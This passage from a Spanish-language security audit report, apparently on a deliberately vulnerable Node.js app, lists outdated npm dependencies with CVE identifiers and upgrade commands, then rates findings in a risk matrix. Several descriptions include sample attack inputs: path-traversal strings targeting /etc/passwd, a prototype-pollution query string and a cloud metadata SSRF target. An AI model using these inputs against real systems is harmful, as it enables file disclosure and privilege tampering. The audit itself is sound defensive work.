Para este análisis se utilizó la herramienta **`npm audit`** sobre el directorio del backend (`vulnerable-cartera-backend`), complementada con revisión manual de los archivos `package.json` de ambos componentes.

| Componente   | Gestor de paquetes | Comando ejecutado          | Total vulnerabilidades |
|--------------|--------------------|----------------------------|------------------------|
| Backend      | npm                | `npm audit --json`         | 25 vulnerabilidades    |
| Frontend     | npm                | `npm audit --json`         | Vulnerabilidades compartidas (axios, lodash) |

Las dependencias directas del backend son las siguientes:

```json
{
  "axios": "0.21.1",
  "body-parser": "1.19.0",
  "cors": "2.8.5",
  "dotenv": "8.2.0",
  "express": "4.17.1",
  "jsonwebtoken": "8.5.1",
  "lodash": "4.17.20",
  "moment": "2.29.1",
  "multer": "1.4.4-lts.1",
  "request": "2.88.2",
  "sqlite3": "5.0.2"
}
```

> **Observación crítica:** El conjunto de dependencias directas del backend presenta un patrón preocupante: prácticamente **cada paquete de producción está desactualizado** y varios acumulan años de parches de seguridad no aplicados. Esto sugiere que la gestión de dependencias no forma parte del ciclo de vida de desarrollo del proyecto.

---

## 6.2 Resumen de Vulnerabilidades por Severidad

| Severidad  | Cantidad | Porcentaje |
|------------|----------|------------|
| Crítica    | 2        | 8 %        |
| Alta       | 18       | 72 %       |
| Moderada   | 3        | 12 %       |
| Baja       | 2        | 8 %        |
| **Total**  | **25**   | 100 %      |

---

## 6.3 Detalle de Hallazgos de Dependencias

---

### DEP-001 — `request` 2.88.2: Server-Side Request Forgery (SSRF) y Paquete Deprecado

| Atributo         | Valor                                                                    |
|------------------|--------------------------------------------------------------------------|
| **Severidad**    | 🔴 Crítica                                                               |
| **GHSA / CVE**   | GHSA-p8p7-x288-28g6                                                      |
| **Paquete**      | `request` 2.88.2                                                         |
| **Tipo**         | Dependencia directa                                                       |
| **Afecta**       | `backend/src/controllers/adminController.js` (transitivo)                |

**Descripción:**

El paquete `request` fue oficialmente marcado como **deprecado en febrero de 2020**. Su mantenimiento cesó por completo y no recibirá correcciones de seguridad. Adicionalmente, la versión 2.88.2 contiene una vulnerabilidad de **Server-Side Request Forgery (SSRF)** que permite a un atacante instruir al servidor para realizar peticiones HTTP arbitrarias a destinos que normalmente estarían fuera del alcance del atacante, incluyendo servicios internos de red y endpoints de metadatos de proveedores de nube (p. ej., `http://169.254.169.254/`).

**Riesgo:**

La explotación exitosa de SSRF puede derivar en exposición de credenciales de infraestructura cloud, acceso a servicios internos no expuestos públicamente, y movimiento lateral dentro de la red interna.

**Solución recomendada:**

Reemplazar completamente el uso de `request` por alternativas modernas y mantenidas:
- `node-fetch` >= 3.x (ESM nativo) o `node-fetch` 2.x para CommonJS
- `axios` >= 1.6.0 (actualizado desde DEP-003)

```bash
npm uninstall request
npm install node-fetch@2
```

---

### DEP-002 — `form-data`: Generación Insegura de Boundary Multipart

| Atributo         | Valor                                                                    |
|------------------|--------------------------------------------------------------------------|
| **Severidad**    | 🔴 Crítica                                                               |
| **GHSA / CVE**   | GHSA-fjgf-rcq5-mfq5                                                      |
| **Paquete**      | `form-data` (dependencia transitiva de `request`, `axios`)               |
| **Tipo**         | Dependencia transitiva                                                    |

**Descripción:**

Las versiones afectadas de `form-data` utilizan `Math.random()` para generar el *boundary* (delimitador) de formularios multipart. `Math.random()` **no es criptográficamente seguro**: es predecible con un número suficiente de observaciones. Un atacante que pueda predecir el valor del boundary puede inyectar contenido arbitrario en cargas multipart, lo que puede derivar en omisión de validaciones, envenenamiento de datos y potencialmente ejecución de código en el servidor receptor.

**Solución recomendada:**

```bash
npm install form-data@4.0.1
```

La versión >= 4.0.1 utiliza `crypto.randomBytes()` para la generación del boundary, que sí cumple con los requisitos de aleatoriedad criptográfica.

---

### DEP-003 — `axios` 0.21.1: Cross-Site Request Forgery (CSRF)

| Atributo         | Valor                                                                    |
|------------------|--------------------------------------------------------------------------|
| **Severidad**    | 🟠 Alta                                                                  |
| **CVE**          | CVE-2023-45857                                                           |
| **Paquete**      | `axios` 0.21.1                                                           |
| **Tipo**         | Dependencia directa (backend y frontend)                                 |

**Descripción:**

La versión 0.21.1 de axios, presente tanto en el backend como en el frontend, contiene una vulnerabilidad de **Cross-Site Request Forgery (CSRF)**. En esta versión, la cabecera `X-XSRF-TOKEN` puede ser expuesta involuntariamente a un host de terceros durante una redirección, filtrando el token de sesión del usuario a un dominio controlado por el atacante. El vector es especialmente grave en el contexto del frontend, donde las sesiones de usuario se gestionan mediante tokens almacenados en cookies o localStorage.

Adicionalmente, la versión 0.21.x tiene más de tres años de antigüedad y acumula numerosas correcciones de seguridad adicionales lanzadas en versiones posteriores.

**Solución recomendada:**

```bash
# Backend
npm install axios@^1.7.0

# Frontend
npm install axios@^1.7.0
```

---

### DEP-004 — `express` 4.17.1: XSS en `response.redirect()`

| Atributo         | Valor                                                                    |
|------------------|--------------------------------------------------------------------------|
| **Severidad**    | 🟠 Alta                                                                  |
| **GHSA / CVE**   | GHSA-qw6h-vgh9-j6wx                                                      |
| **Paquete**      | `express` 4.17.1                                                         |
| **Tipo**         | Dependencia directa (framework principal)                                |

**Descripción:**

Express 4.17.1 es vulnerable a **Cross-Site Scripting (XSS)** cuando se invoca `response.redirect()` con una URL controlada por el usuario. El framework genera una página HTML de respuesta de redirección sin escapar correctamente el valor de la URL, lo que permite inyectar HTML/JavaScript arbitrario en el cuerpo de la respuesta. El impacto es directamente proporcional al número de rutas que acepten URLs de redirección como parámetro de entrada.

**Solución recomendada:**

```bash
npm install express@^4.21.0
```

La versión >= 4.19.2 corrige esta vulnerabilidad. Se recomienda la 4.21.x como versión estable más reciente de la rama 4.x.

---

### DEP-005 — `jsonwebtoken` 8.5.1: Uso de Claves de Tipo No Restringido

| Atributo         | Valor                                                                    |
|------------------|--------------------------------------------------------------------------|
| **Severidad**    | 🟠 Alta                                                                  |
| **CVE**          | CVE-2022-23529                                                           |
| **Paquete**      | `jsonwebtoken` 8.5.1                                                     |
| **Tipo**         | Dependencia directa                                                       |

**Descripción:**

La versión 8.5.1 de `jsonwebtoken` no impone restricciones sobre el tipo de objeto utilizado como clave secreta en la función `verify()`. Un atacante con capacidad de influir en la clave de verificación (p. ej., mediante inyección de configuración) puede pasar un objeto manipulado que sea aceptado como clave válida, derivando en la aceptación de tokens JWT falsificados y, por consiguiente, en omisión de autenticación completa.

> **Nota de ironía técnica:** Como se documenta en el hallazgo SEC-003 de la Parte 1 de este informe, la aplicación **no implementa verificación JWT real**: utiliza un esquema de tokens propietarios inseguros basados en separadores. Por tanto, esta vulnerabilidad en `jsonwebtoken` no tiene impacto directo en la lógica actual, pero la presencia de la dependencia vulnerable en el `package.json` implica que cualquier refactorización que introduzca JWT real podría heredar esta vulnerabilidad de forma inadvertida.

**Solución recomendada:**

```bash
npm install jsonwebtoken@^9.0.2
```

---

### DEP-006 — `lodash` 4.17.20: Inyección de Comandos

| Atributo         | Valor                                                                    |
|------------------|--------------------------------------------------------------------------|
| **Severidad**    | 🟠 Alta                                                                  |
| **CVE**          | CVE-2021-23337                                                           |
| **Paquete**      | `lodash` 4.17.20                                                         |
| **Tipo**         | Dependencia directa (backend y frontend)                                 |

**Descripción:**

La función `lodash.template()` en versiones anteriores a 4.17.21 es vulnerable a **inyección de comandos** cuando se pasan como opciones objetos controlados por el usuario. Específicamente, la opción `sourceURL` no es correctamente validada, permitiendo que un atacante inyecte código Node.js arbitrario en el contexto de ejecución de la plantilla. Si la aplicación utiliza `_.template()` con datos de entrada del usuario, la explotación puede derivar en RCE.

**Solución recomendada:**

```bash
# Backend y Frontend
npm install lodash@^4.17.21
```

La corrección es mínima (de 4.17.20 a 4.17.21) y no introduce cambios de API incompatibles.

---

### DEP-007 — `moment` 2.29.1: Path Traversal y Estado Legacy

| Atributo         | Valor                                                                    |
|------------------|--------------------------------------------------------------------------|
| **Severidad**    | 🟠 Alta                                                                  |
| **CVE**          | CVE-2022-24785                                                           |
| **Paquete**      | `moment` 2.29.1                                                          |
| **Tipo**         | Dependencia directa                                                       |

**Descripción:**

La función `moment.locale()` en versiones anteriores a 2.29.2 es vulnerable a **path traversal** cuando se le pasa una cadena de localización controlada por el usuario. Un atacante puede suministrar una cadena como `../../etc/passwd` que `moment` intentará resolver como ruta de archivo de localización, pudiendo leer archivos arbitrarios del sistema de archivos del servidor.

Adicionalmente, el equipo de `moment.js` declaró oficialmente el proyecto en **modo legacy en 2020**, recomendando a nuevos proyectos migrar a alternativas modernas. No se publicarán nuevas funcionalidades y el soporte de seguridad es limitado.

**Solución recomendada:**

Migrar a una librería de fechas moderna:
- **`date-fns`** >= 3.x: API funcional, tree-shakeable, sin efectos secundarios.
- **`Day.js`** >= 1.x: API compatible con moment, < 2 KB.

```bash
npm uninstall moment
npm install date-fns@^3.6.0
```

---

### DEP-008 — `multer` 1.4.4-lts.1: Denegación de Servicio

| Atributo         | Valor                                                                    |
|------------------|--------------------------------------------------------------------------|
| **Severidad**    | 🟠 Alta                                                                  |
| **GHSA / CVE**   | GHSA-wm7h-9275-46v2                                                      |
| **Paquete**      | `multer` 1.4.4-lts.1                                                     |
| **Tipo**         | Dependencia directa                                                       |

**Descripción:**

La versión 1.4.4-lts.1 de `multer` es vulnerable a **Denegación de Servicio (DoS)** mediante solicitudes multipart maliciosamente construidas. Un atacante puede enviar una petición con un cuerpo multipart especialmente formateado que provoca un consumo excesivo de CPU y/o memoria en el servidor durante el procesamiento, degradando la disponibilidad del servicio para usuarios legítimos. El vector es especialmente crítico en endpoints públicos de subida de archivos.

**Solución recomendada:**

```bash
npm install multer@^1.4.5-lts.1
```

---

### DEP-009 — `body-parser` 1.19.0: Denegación de Servicio con URL Encoding

| Atributo         | Valor                                                                    |
|------------------|--------------------------------------------------------------------------|
| **Severidad**    | 🟠 Alta                                                                  |
| **GHSA / CVE**   | GHSA-qwcr-r2fm-qrc7                                                      |
| **Paquete**      | `body-parser` 1.19.0                                                     |
| **Tipo**         | Dependencia directa                                                       |

**Descripción:**

Cuando la opción `urlencoded: { extended: true }` está habilitada, versiones anteriores a 1.20.3 de `body-parser` son vulnerables a **DoS** mediante la inyección de cargas útiles extremadamente grandes o anidadas en el cuerpo de la solicitud. La librería no impone límites adecuados durante el proceso de análisis, lo que puede derivar en consumo excesivo de memoria y degradación del rendimiento del servidor.

**Solución recomendada:**

```bash
npm install body-parser@^1.20.3
```

Adicionalmente, verificar que el límite de tamaño de cuerpo esté configurado explícitamente:
```js
app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true, limit: '1mb' }));
```

---

### DEP-010 — `sqlite3` 5.0.2: DoS por Parámetros Inválidos

| Atributo         | Valor                                                                    |
|------------------|--------------------------------------------------------------------------|
| **Severidad**    | 🟠 Alta                                                                  |
| **GHSA / CVE**   | GHSA-jqv5-whv4-4765                                                      |
| **Paquete**      | `sqlite3` 5.0.2                                                          |
| **Tipo**         | Dependencia directa                                                       |

**Descripción:**

La versión 5.0.2 de `sqlite3` es vulnerable a **Denegación de Servicio** cuando se intentan enlazar parámetros de tipo inválido en una sentencia preparada. Un atacante que pueda influir en los valores de los parámetros de una consulta puede provocar el bloqueo del proceso Node.js o un error no manejado que detenga el servidor.

**Solución recomendada:**

```bash
npm install sqlite3@^5.1.7
```

---

### DEP-011 — `path-to-regexp`: ReDoS por Backtracking Catastrófico

| Atributo         | Valor                                                                    |
|------------------|--------------------------------------------------------------------------|
| **Severidad**    | 🟠 Alta (transitiva por Express)                                         |
| **GHSA / CVE**   | GHSA-9wv6-86v2-598j                                                      |
| **Paquete**      | `path-to-regexp` (dependencia transitiva de `express`)                   |
| **Tipo**         | Dependencia transitiva                                                    |

**Descripción:**

Las versiones antiguas de `path-to-regexp` —usadas internamente por Express para el enrutamiento— generan expresiones regulares con **backtracking catastrófico**. Este patrón conocido como **ReDoS (Regular Expression Denial of Service)** permite a un atacante enviar rutas URL especialmente construidas que hacen que el motor de expresiones regulares ejecute en tiempo exponencial, bloqueando el event loop de Node.js y dejando el servidor inresponsivo para todos los usuarios.

**Solución recomendada:**

La corrección se obtiene actualizando Express a una versión que incluya `path-to-regexp` >= 0.1.10 o >= 8.x según la rama:

```bash
npm install express@^4.21.0
```

---

### DEP-012 — `qs`: Prototype Pollution

| Atributo         | Valor                                                                    |
|------------------|--------------------------------------------------------------------------|
| **Severidad**    | 🟠 Alta (transitiva por `body-parser` / Express)                        |
| **CVE**          | CVE-2022-24999                                                           |
| **Paquete**      | `qs` (dependencia transitiva)                                            |
| **Tipo**         | Dependencia transitiva                                                    |

**Descripción:**

La librería `qs`, utilizada por `body-parser` y Express para el análisis de query strings, es vulnerable a **Prototype Pollution** en versiones anteriores a 6.11.0. Un atacante puede enviar un query string como `?__proto__[admin]=true` que modifica el prototipo de `Object` en el contexto de ejecución de Node.js, pudiendo alterar el comportamiento de cualquier objeto JavaScript en la aplicación y potencialmente escalar a RCE o bypass de autenticación dependiendo de cómo se utilicen los objetos resultantes.

**Solución recomendada:**

La corrección se obtiene actualizando las dependencias padre:

```bash
npm install express@^4.21.0 body-parser@^1.20.3
```

---

### DEP-013 — `dotenv` 8.2.0: Versión Obsoleta

| Atributo         | Valor                                                                    |
|------------------|--------------------------------------------------------------------------|
| **Severidad**    | 🟡 Baja                                                                  |
| **CVE**          | N/A                                                                      |
| **Paquete**      | `dotenv` 8.2.0                                                           |
| **Tipo**         | Dependencia directa                                                       |

**Descripción:**

La versión 8.2.x de `dotenv` es funcional pero se encuentra muy por detrás de la versión actual (16.x). Las versiones intermedias introdujeron correcciones de compatibilidad con Node.js moderno, soporte para archivos `.env.local`, expansión de variables, y diversas mejoras de rendimiento y ergonomía. Si bien no se conoce un CVE activo, la versión 8.x puede presentar comportamientos inesperados con versiones de Node.js >= 18 y no recibe actualizaciones de seguridad.

**Solución recomendada:**

```bash
npm install dotenv@^16.4.5
```

---

### DEP-014 — `eslint` 7.32.0: Fin de Vida (EOL)

| Atributo         | Valor                                                                    |
|------------------|--------------------------------------------------------------------------|
| **Severidad**    | 🟡 Baja                                                                  |
| **CVE**          | N/A                                                                      |
| **Paquete**      | `eslint` 7.32.0                                                          |
| **Tipo**         | Dependencia de desarrollo                                                 |

**Descripción:**

ESLint 7.x alcanzó su fin de vida (EOL) y no recibe actualizaciones de seguridad. La versión actual es 9.x, que introduce la nueva arquitectura de configuración plana (`eslint.config.js`). Utilizar ESLint obsoleto implica que las reglas de análisis estático para detección de vulnerabilidades de seguridad (p. ej., `eslint-plugin-security`) no cubren patrones de vulnerabilidad descubiertos en los últimos años.

**Solución recomendada:**

```bash
npm install --save-dev eslint@^9.x
```

Nota: la migración de ESLint 7 a 9 requiere actualizar el archivo de configuración al nuevo formato plano.

---

### DEP-015 — `vite` 5.0.0 (Frontend): Path Traversal en Modo Desarrollo

| Atributo         | Valor                                                                    |
|------------------|--------------------------------------------------------------------------|
| **Severidad**    | 🟠 Alta                                                                  |
| **GHSA / CVE**   | GHSA-vg6x-rcgg-rjx6 / GHSA-4vvj-4cpr-p986                              |
| **Paquete**      | `vite` 5.0.0                                                             |
| **Tipo**         | Dependencia directa (frontend, herramienta de build/desarrollo)          |

**Descripción:**

Vite 5.0.0 contiene vulnerabilidades de **path traversal** en su servidor de desarrollo (`vite dev`). Un atacante con acceso a la red del servidor de desarrollo puede solicitar rutas con secuencias como `/@fs/etc/passwd` para acceder a archivos arbitrarios del sistema de archivos del host, ignorando las restricciones configuradas en `server.fs.allow`. Si bien el servidor de desarrollo no debería estar expuesto en producción, en entornos de CI/CD o durante pruebas de integración en redes compartidas, el riesgo es real y explotable.

**Solución recomendada:**

```bash
npm install vite@^5.4.14
# o migrar a la rama estable 6.x
npm install vite@^6.3.0
```

---

## 6.4 Resumen de Hallazgos de Dependencias

| ID      | Paquete                | Versión Actual    | Severidad  | CVE / GHSA              | Solución                         |
|---------|------------------------|-------------------|------------|-------------------------|----------------------------------|
| DEP-001 | `request`              | 2.88.2            | 🔴 Crítica | GHSA-p8p7-x288-28g6     | Migrar a `node-fetch` o `axios`  |
| DEP-002 | `form-data`            | < 4.0.1           | 🔴 Crítica | GHSA-fjgf-rcq5-mfq5     | Actualizar a >= 4.0.1            |
| DEP-003 | `axios`                | 0.21.1            | 🟠 Alta    | CVE-2023-45857          | Actualizar a >= 1.7.0            |
| DEP-004 | `express`              | 4.17.1            | 🟠 Alta    | GHSA-qw6h-vgh9-j6wx     | Actualizar a >= 4.21.0           |
| DEP-005 | `jsonwebtoken`         | 8.5.1             | 🟠 Alta    | CVE-2022-23529          | Actualizar a >= 9.0.2            |
| DEP-006 | `lodash`               | 4.17.20           | 🟠 Alta    | CVE-2021-23337          | Actualizar a >= 4.17.21          |
| DEP-007 | `moment`               | 2.29.1            | 🟠 Alta    | CVE-2022-24785          | Migrar a `date-fns` 3.x          |
| DEP-008 | `multer`               | 1.4.4-lts.1       | 🟠 Alta    | GHSA-wm7h-9275-46v2     | Actualizar a >= 1.4.5-lts.1      |
| DEP-009 | `body-parser`          | 1.19.0            | 🟠 Alta    | GHSA-qwcr-r2fm-qrc7     | Actualizar a >= 1.20.3           |
| DEP-010 | `sqlite3`              | 5.0.2             | 🟠 Alta    | GHSA-jqv5-whv4-4765     | Actualizar a >= 5.1.7            |
| DEP-011 | `path-to-regexp`       | < 0.1.10 (trans.) | 🟠 Alta    | GHSA-9wv6-86v2-598j     | Actualizar `express`             |
| DEP-012 | `qs`                   | < 6.11.0 (trans.) | 🟠 Alta    | CVE-2022-24999          | Actualizar `express`/`body-parser`|
| DEP-013 | `dotenv`               | 8.2.0             | 🟡 Baja    | N/A                     | Actualizar a >= 16.4.5           |
| DEP-014 | `eslint`               | 7.32.0            | 🟡 Baja    | N/A                     | Actualizar a >= 9.x              |
| DEP-015 | `vite`                 | 5.0.0             | 🟠 Alta    | GHSA-vg6x-rcgg-rjx6     | Actualizar a >= 5.4.14 o 6.x     |

---

---

# 7. VALORACIÓN DE RIESGOS

## 7.1 Metodología de Valoración

La valoración de riesgos aplica una matriz simplificada basada en los principios de **CVSS 3.1** (Common Vulnerability Scoring System), adaptada para facilitar la comunicación con equipos técnicos y de gestión. El nivel de riesgo se calcula como el producto de la probabilidad de explotación y el impacto potencial sobre la confidencialidad, integridad y disponibilidad del sistema.

### Escala de Probabilidad

| Valor | Descripción |
|-------|-------------|
| **3 — Alta** | El ataque es trivial, no requiere autenticación previa, no necesita condiciones especiales y existe exploit público conocido. |
| **2 — Media** | El ataque requiere cierto nivel de acceso, conocimiento técnico o la concurrencia de condiciones específicas. |
| **1 — Baja** | El ataque es complejo, requiere acceso privilegiado, condiciones muy específicas o se trata de una vulnerabilidad teórica. |

### Escala de Impacto

| Valor | Descripción |
|-------|-------------|
| **3 — Alto** | Compromiso total del sistema, exfiltración masiva de datos, interrupción completa del servicio, o impacto irreversible. |
| **2 — Medio** | Compromiso parcial, exfiltración limitada, degradación significativa del servicio o impacto reversible pero costoso. |
| **1 — Bajo** | Impacto menor, exposición de información no crítica, o degradación mínima del servicio. |

### Nivel de Riesgo

| Puntuación (P × I) | Clasificación |
|--------------------|---------------|
| 7 — 9              | 🔴 Crítico    |
| 4 — 6              | 🟠 Alto       |
| 3                  | 🟡 Medio      |
| 1 — 2              | 🟢 Bajo       |

---

## 7.2 Tabla Completa de Valoración de Riesgos

### 7.2.1 Hallazgos de Seguridad (SEC)

| ID       | Nombre del Hallazgo                              | P | I | P×I | Clasificación | Justificación breve                                                          |
|----------|--------------------------------------------------|---|---|-----|---------------|------------------------------------------------------------------------------|
| SEC-001  | Inyección SQL en múltiples endpoints             | 3 | 3 | 9   | 🔴 Crítico    | Sin parámetros enlazados; explotable con curl básico; impacto total sobre BD |
| SEC-002  | Subida de archivos sin restricción               | 3 | 3 | 9   | 🔴 Crítico    | Permite subir webshells; no valida tipo ni contenido; RCE directo            |
| SEC-003  | Autenticación completamente rota                 | 3 | 3 | 9   | 🔴 Crítico    | Token predecible; el rol lo suministra el atacante; sin firma criptográfica  |
| SEC-004  | RCE vía inyección de comandos (`exec`)           | 3 | 3 | 9   | 🔴 Crítico    | Endpoint público; `cmd` sin sanitizar; shell del servidor comprometible      |
| SEC-005  | RCE vía `eval()` sin restricciones              | 3 | 3 | 9   | 🔴 Crítico    | `eval` sobre input directo del usuario; acceso total al runtime Node.js      |
| SEC-006  | Control de acceso ausente (BOLA / BFLA)          | 3 | 3 | 9   | 🔴 Crítico    | Cualquier usuario accede a recursos de cualquier otro sin validación         |
| SEC-007  | Credenciales hardcodeadas en código fuente       | 3 | 3 | 9   | 🔴 Crítico    | Claves AWS, passwords, JWT en repositorio git; exposición permanente         |
| SEC-008  | Exposición de variables de entorno vía API       | 3 | 3 | 9   | 🔴 Crítico    | `process.env` completo en respuesta JSON; sin autenticación requerida        |
| SEC-009  | SSRF en endpoint de fetch administrativo         | 3 | 2 | 6   | 🟠 Alto       | Sin validación de destino; acceso a red interna y metadatos cloud            |
| SEC-010  | XSS almacenado en campo `notes` de clientes      | 3 | 2 | 6   | 🟠 Alto       | `dangerouslySetInnerHTML` sin DOMPurify; payload persiste en BD              |
| SEC-011  | Path traversal en lectura de archivos            | 3 | 2 | 6   | 🟠 Alto       | `path.join` sin restricción; lectura de `.env`, `/etc/passwd`                |
| SEC-012  | Auto-login por parámetro URL (`?zap=auto`)       | 3 | 3 | 9   | 🔴 Crítico    | Cualquier visitante obtiene sesión de admin; password en bundle JS           |
| SEC-013  | Contraseñas almacenadas en texto plano           | 3 | 3 | 9   | 🔴 Crítico    | Sin hashing; dump de BD expone todas las credenciales directamente           |
| SEC-014  | CORS configurado como wildcard (`*`)             | 2 | 2 | 4   | 🟠 Alto       | Permite peticiones cross-origin desde cualquier dominio malicioso            |
| SEC-015  | Headers HTTP informativos inseguros              | 2 | 1 | 2   | 🟢 Bajo       | Revela versión exacta de Express y hostname; facilita fingerprinting         |
| SEC-016  | Ausencia de rate limiting                        | 3 | 2 | 6   | 🟠 Alto       | Permite fuerza bruta y DoS en todos los endpoints; sin throttling            |
| SEC-017  | Logging excesivo de tokens en consola            | 2 | 2 | 4   | 🟠 Alto       | Tokens y datos sensibles en logs; riesgo si logs son accesibles              |
| SEC-018  | Sin cabeceras de seguridad HTTP (CSP, HSTS)      | 2 | 2 | 4   | 🟠 Alto       | Clickjacking, MIME sniffing y ataques de downgrade habilitados               |
| SEC-019  | Caché insegura (`Cache-Control: public`)         | 2 | 2 | 4   | 🟠 Alto       | Respuestas con datos sensibles pueden ser cacheadas en proxies               |
| SEC-020  | Verificación de token JWT sin firma real         | 3 | 3 | 9   | 🔴 Crítico    | El "token" es texto libre; cualquiera puede forjar identidad arbitraria      |
| SEC-021  | Directorio de uploads accesible públicamente     | 2 | 2 | 4   | 🟠 Alto       | Archivos subidos servidos sin control de acceso ni validación                |
| SEC-022  | Sin validación de tipo de contenido en uploads   | 3 | 2 | 6   | 🟠 Alto       | Acepta cualquier extensión y MIME type; facilita subida de payloads          |
| SEC-023  | Errores internos expuestos al cliente            | 2 | 1 | 2   | 🟢 Bajo       | Stack traces y mensajes de error en respuestas; facilita reconocimiento      |
| SEC-024  | Sin política de contraseñas                      | 2 | 2 | 4   | 🟠 Alto       | Contraseñas triviales aceptadas sin restricciones de longitud/complejidad    |
| SEC-025  | ReDoS en validaciones de entrada                 | 2 | 2 | 4   | 🟠 Alto       | Expresiones regulares con backtracking catastrófico en rutas                 |
| SEC-026  | Información de versiones en headers              | 1 | 1 | 1   | 🟢 Bajo       | `X-Powered-By` revela framework y versión; trivial de mitigar               |
| SEC-027  | Sin protección contra CSRF en API                | 2 | 2 | 4   | 🟠 Alto       | Sin tokens CSRF; SameSite no configurado en cookies                          |
| SEC-028  | Sesiones sin expiración configurada              | 2 | 2 | 4   | 🟠 Alto       | Tokens no expiran; riesgo de sesiones eternas tras compromiso                |

---

### 7.2.2 Hallazgos de Calidad de Software (CAL)

| ID       | Nombre del Hallazgo                              | P | I | P×I | Clasificación | Justificación breve                                                          |
|----------|--------------------------------------------------|---|---|-----|---------------|------------------------------------------------------------------------------|
| CAL-001  | Código duplicado masivo                          | 3 | 2 | 6   | 🟠 Alto       | Duplicación > 30 %; correcciones de seguridad deben aplicarse múltiples veces|
| CAL-002  | Complejidad ciclomática elevada                  | 2 | 2 | 4   | 🟠 Alto       | Funciones con CC > 15; alto riesgo de regresiones y difícil de auditar       |
| CAL-003  | Ausencia de tests unitarios                      | 3 | 2 | 6   | 🟠 Alto       | Sin cobertura de tests; vulnerabilidades no detectables en CI/CD             |
| CAL-004  | Variables globales mutables sin control          | 2 | 1 | 2   | 🟢 Bajo       | Estado global mutable; riesgo de condiciones de carrera en alta concurrencia |
| CAL-005  | `console.log` en código de producción            | 2 | 1 | 2   | 🟢 Bajo       | Filtración de datos sensibles en logs de producción                          |
| CAL-006  | Funciones con demasiados parámetros              | 1 | 1 | 1   | 🟢 Bajo       | Dificulta mantenimiento; riesgo de errores de orden de parámetros            |
| CAL-007  | Manejo de errores incorrecto (`swallow errors`)  | 2 | 2 | 4   | 🟠 Alto       | Errores silenciados ocultan fallos de seguridad y condiciones anómalas       |
| CAL-008  | SQL construido con concatenación de strings      | 3 | 3 | 9   | 🔴 Crítico    | Patrón arquitectural que genera SQLi; afecta múltiples archivos              |
| CAL-009  | Uso de `var` en lugar de `const`/`let`           | 1 | 1 | 1   | 🟢 Bajo       | Hoisting de variables; comportamiento inesperado en cierres                  |
| CAL-010  | Dependencias no utilizadas en `package.json`     | 1 | 1 | 1   | 🟢 Bajo       | Superficie de ataque innecesaria; aumenta el tamaño del bundle               |

---

### 7.2.3 Hallazgos de Dependencias (DEP)

| ID       | Nombre del Hallazgo                              | P | I | P×I | Clasificación | Justificación breve                                                          |
|----------|--------------------------------------------------|---|---|-----|---------------|------------------------------------------------------------------------------|
| DEP-001  | `request` 2.88.2 — SSRF / Deprecado             | 3 | 3 | 9   | 🔴 Crítico    | Paquete deprecado con CVE activo; SSRF con acceso a metadatos cloud          |
| DEP-002  | `form-data` — Boundary inseguro (`Math.random`) | 2 | 2 | 4   | 🟠 Alto       | Boundary predecible; inyección de contenido en multipart                     |
| DEP-003  | `axios` 0.21.1 — CSRF                            | 2 | 2 | 4   | 🟠 Alto       | Fuga de token CSRF en redirecciones; presente en backend y frontend          |
| DEP-004  | `express` 4.17.1 — XSS en redirect              | 2 | 2 | 4   | 🟠 Alto       | XSS en respuestas de redirección si URL controlada por usuario               |
| DEP-005  | `jsonwebtoken` 8.5.1 — Clave sin restricción     | 1 | 3 | 3   | 🟡 Medio      | No activo actualmente (app no usa JWT real), pero riesgo latente             |
| DEP-006  | `lodash` 4.17.20 — Command Injection             | 2 | 3 | 6   | 🟠 Alto       | Si `_.template()` recibe input de usuario; impacto de RCE potencial          |
| DEP-007  | `moment` 2.29.1 — Path Traversal + Legacy        | 2 | 2 | 4   | 🟠 Alto       | Path traversal en `locale()`; paquete sin soporte activo                     |
| DEP-008  | `multer` 1.4.4-lts.1 — DoS                       | 2 | 2 | 4   | 🟠 Alto       | Solicitudes maliciosas pueden colapsar el servidor de uploads                |
| DEP-009  | `body-parser` 1.19.0 — DoS                       | 2 | 2 | 4   | 🟠 Alto       | Payloads grandes o anidados causan consumo excesivo de memoria               |
| DEP-010  | `sqlite3` 5.0.2 — DoS                            | 2 | 2 | 4   | 🟠 Alto       | Parámetros inválidos pueden bloquear el proceso Node.js                      |
| DEP-011  | `path-to-regexp` — ReDoS                         | 2 | 2 | 4   | 🟠 Alto       | URLs especiales bloquean el event loop; transitiva por Express               |
| DEP-012  | `qs` — Prototype Pollution                       | 2 | 3 | 6   | 🟠 Alto       | Modifica `Object.prototype`; puede afectar toda la lógica de la aplicación   |
| DEP-013  | `dotenv` 8.2.0 — Obsoleto                        | 1 | 1 | 1   | 🟢 Bajo       | Sin CVE activo; riesgo de compatibilidad con Node.js moderno                 |
| DEP-014  | `eslint` 7.32.0 — EOL                            | 1 | 1 | 1   | 🟢 Bajo       | Herramienta de desarrollo; sin impacto directo en runtime                    |
| DEP-015  | `vite` 5.0.0 — Path Traversal                   | 2 | 2 | 4   | 🟠 Alto       | Lectura de archivos del host si el servidor dev está expuesto                |

---

## 7.3 Distribución del Riesgo

| Clasificación | Cantidad | Porcentaje |
|---------------|----------|------------|
| 🔴 Crítico    | 14       | 26 %       |
| 🟠 Alto       | 29       | 54 %       |
| 🟡 Medio      | 1        | 2 %        |
| 🟢 Bajo       | 10       | 18 %       |
| **Total**     | **54**   | 100 %      |

---

## 7.4 Análisis y Justificación de las Valoraciones Principales

### Hallazgos con Riesgo Crítico (9/9)

La concentración de **14 hallazgos críticos** en una sola aplicación es indicativa de una ausencia sistemática de prácticas de seguridad en el desarrollo, no de incidentes aislados. Cada uno de estos hallazgos, por sí solo, sería suficiente para comprometer completamente el sistema.

Los hallazgos **SEC-001** (Inyección SQL), **SEC-004** (RCE vía `exec`) y **SEC-005** (RCE vía `eval`) reciben la puntuación máxima de 9 porque combinan los tres factores de máxima gravedad: son trivialmente explotables por cualquier actor sin conocimiento previo del sistema (probabilidad 3), el código vulnerable es directamente accesible sin autenticación previa, y su impacto incluye el compromiso total del servidor —incluyendo acceso al sistema de archivos, ejecución de procesos arbitrarios y exfiltración completa de la base de datos (impacto 3).

El hallazgo **SEC-012** (Auto-login por parámetro URL) merece mención especial por su carácter inusual: aunque fue diseñado como mecanismo de facilitación para escáneres DAST, su presencia en código de producción (o cualquier entorno accesible externamente) convierte cualquier URL pública en una puerta de administrador abierta. La inclusión de la contraseña en texto plano dentro del bundle JavaScript hace que sea permanentemente recuperable, incluso después de que el endpoint sea deshabilitado.

